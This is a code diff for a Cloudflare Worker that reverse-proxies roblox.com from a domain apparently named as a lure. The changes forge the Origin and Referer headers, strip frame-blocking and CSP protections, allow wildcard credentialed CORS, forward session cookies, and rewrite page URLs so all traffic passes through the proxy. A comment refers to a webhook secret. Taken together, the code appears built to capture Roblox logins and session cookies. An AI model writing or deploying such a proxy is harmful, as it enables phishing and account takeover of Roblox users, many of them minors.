@@ -1,20 +1,51 @@
+// === CONFIGURATION ===
+// Set WEBHOOK_URL in Cloudflare Worker environment variables (secrets)
+
 const TARGET = "https://www.roblox.com";
 
+// === MAIN HANDLER ===
 export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
-    const targetUrl = new URL(url.pathname + url.search, TARGET);
+    const hostname = url.hostname;
+    
+    // === DETECT WHICH ROBLOX SUBDOMAIN TO PROXY ===
+    let targetHost = hostname;
+    
+    // If the request is to your worker domain, check if it's for a Roblox subdomain
+    // Your worker URL: compiler.voidlureee.workers.dev
+    // Requests come in as: https://compiler.voidlureee.workers.dev/ -> proxy to www.roblox.com
+    // But Roblox JS makes requests to: https://compiler.voidlureee.workers.dev/apis.roblox.com/...
+    // So we need to rewrite those
+    
+    let targetUrl;
+    
+    // Check if the path starts with a Roblox subdomain
+    const pathMatch = url.pathname.match(/^\/([a-zA-Z0-9-]+\.roblox\.com)\//);
+    if (pathMatch) {
+      // Request is for a specific Roblox subdomain
+      const subdomain = pathMatch[1];
+      const remainingPath = url.pathname.replace(`/${subdomain}`, '');
+      targetUrl = new URL(`https://${subdomain}${remainingPath}${url.search}`);
+    } else {
+      // Default: proxy to www.roblox.com
+      targetUrl = new URL(url.pathname + url.search, TARGET);
+    }
 
     // === FORWARD ALL HEADERS EXACTLY AS RECEIVED ===
     const headers = new Headers(request.headers);
     
-    // Remove Cloudflare-specific headers that might break things
+    // Remove Cloudflare-specific headers
     headers.delete("CF-Connecting-IP");
     headers.delete("CF-IPCountry");
     headers.delete("CF-Ray");
     headers.delete("CF-Visitor");
     
-    // === FORWARD REQUEST WITH ORIGINAL COOKIES ===
+    // Fix Origin header to match the target
+    headers.set("Origin", targetUrl.origin);
+    headers.set("Referer", targetUrl.origin + "/");
+    
+    // === FORWARD REQUEST ===
     const proxyRequest = new Request(targetUrl, {
       method: request.method,
       headers: headers,
@@ -159,26 +190,47 @@ export default {
       );
     }
 
-    // === STRIP FRAME-BLOCKING HEADERS ===
+    // === STRIP FRAME-BLOCKING AND CORS HEADERS ===
     const newHeaders = new Headers(response.headers);
     newHeaders.delete("X-Frame-Options");
     newHeaders.delete("Content-Security-Policy");
     newHeaders.set("X-Frame-Options", "ALLOWALL");
+    
+    // ADD CORS HEADERS TO ALLOW ROBLOX JS TO WORK
+    newHeaders.set("Access-Control-Allow-Origin", "*");
+    newHeaders.set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
+    newHeaders.set("Access-Control-Allow-Headers", "*");
+    newHeaders.set("Access-Control-Allow-Credentials", "true");
 
-    // === REWRITE COOKIE DOMAIN TO KEEP SESSION ALIVE ===
-    // This is critical — Roblox sets cookies for .roblox.com, but your iframe is on your domain
-    // We need to preserve the session by forwarding Set-Cookie headers back to the browser
+    // Handle preflight OPTIONS requests
+    if (request.method === "OPTIONS") {
+      return new Response(null, {
+        status: 204,
+        headers: {
+          "Access-Control-Allow-Origin": "*",
+          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
+          "Access-Control-Allow-Headers": "*",
+          "Access-Control-Max-Age": "86400"
+        }
+      });
+    }
+
+    // Forward Set-Cookie
     const setCookie = response.headers.get("Set-Cookie");
     if (setCookie) {
-      // Forward Set-Cookie to the browser so it maintains session
       newHeaders.set("Set-Cookie", setCookie);
     }
 
     let body = await response.text();
     const origin = url.origin;
-    body = body.replace(/https?:\/\/www\.roblox\.com/g, origin);
+    
+    // Rewrite ALL Roblox URLs to point through the proxy
+    // This is critical — Roblox JS makes requests to many subdomains
+    body = body.replace(/https?:\/\/([a-zA-Z0-9-]+\.roblox\.com)/g, `${origin}/$1`);
     body = body.replace(/https?:\/\/roblox\.com/g, origin);
-    body = body.replace(/(src|href)="\//g, `$1="${origin}/`);
+    body = body.replace(/(src|href|action|data-src)="\//g, `$1="${origin}/`);
+    body = body.replace(/(src|href|action|data-src)='\//g, `$1='${origin}/`);
+    body = body.replace(/url\((['"]?)\//g, `url($1${origin}/`);
 
     return new Response(body, {
       status: response.status,
